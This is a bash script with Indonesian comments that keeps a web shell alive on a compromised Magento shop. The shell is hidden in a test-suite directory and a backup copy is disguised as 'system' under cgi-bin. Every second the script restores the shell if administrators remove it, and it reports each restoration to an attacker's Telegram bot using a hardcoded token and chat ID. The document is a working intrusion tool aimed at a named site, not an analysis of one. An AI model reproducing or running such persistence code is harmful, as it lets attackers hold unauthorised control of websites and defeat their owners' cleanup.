#!/bin/bash

# Definisikan lokasi file index.php Permissions 755
INDEX_FILE="/home/ilincaboutique.com/public_html/dev/tests/functional/testsuites/Magento/Mtf/TestSuite/InjectableTests/file_base.php"
# Definisikan lokasi folder backup Permissions 755
BACKUP_FOLDER="/home/ilincaboutique.com/public_html/cgi-bin/cgi-bin"
# Buat folder backup jika belum ada
mkdir -p "$BACKUP_FOLDER"
# Tentukan nama file backup Permissions 755
BACKUP_FILE="$BACKUP_FOLDER/system"

# Token dan ID chat Telegram
TOKEN="7588613295:AAHNs_IOFuLy_weuOoKMPWaGobPMvtz5mp4"
CHAT_ID="7234811259"  # Ganti dengan ID chat Anda

# Fungsi untuk mengirim notifikasi ke Telegram
send_telegram_notification() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d text="$message"
}

# Backup file index.php jika belum ada backup
if [ ! -f "$BACKUP_FILE" ]; then
    cp "$INDEX_FILE" "$BACKUP_FILE"
    echo "Backup pertama dibuat: $BACKUP_FILE"
    send_telegram_notification "Backup pertama dibuat: $BACKUP_FILE"
fi

# Fungsi untuk memonitor perubahan pada file index.php
monitor_file() {
    while true; do
        # Hitung checksum file index.php untuk mendeteksi perubahan
        CURRENT_CHECKSUM=$(md5sum "$INDEX_FILE" | awk '{ print $1 }')
        BACKUP_CHECKSUM=$(md5sum "$BACKUP_FILE" | awk '{ print $1 }')

        if [ "$CURRENT_CHECKSUM" != "$BACKUP_CHECKSUM" ]; then
            # Jika checksum berbeda, kembalikan file index.php dari backup
            echo "Change, mengembalikan backup..."
            cp "$BACKUP_FILE" "$INDEX_FILE"
            echo "https://ilincaboutique.com/dev/tests/functional/testsuites/Magento/Mtf/TestSuite/InjectableTests/file_base.php"
            send_telegram_notification "shell di hapus. SUDAH DI KEMBALIKAN." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
        fi

        # Tunggu 1 detik sebelum pengecekan selanjutnya
        sleep 1
    done
}

# Jalankan fungsi monitoring
monitor_file
